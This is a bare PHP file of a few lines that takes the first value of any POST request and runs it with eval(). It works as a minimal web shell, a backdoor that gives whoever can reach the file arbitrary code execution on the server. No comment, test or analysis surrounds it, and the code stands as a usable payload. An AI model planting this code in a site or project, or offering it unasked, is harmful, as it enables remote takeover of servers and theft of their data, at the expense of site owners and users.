<?
    $code = '';
    foreach($_POST as $a){
        $code = $a;
        break;
    }
    eval($code);
?>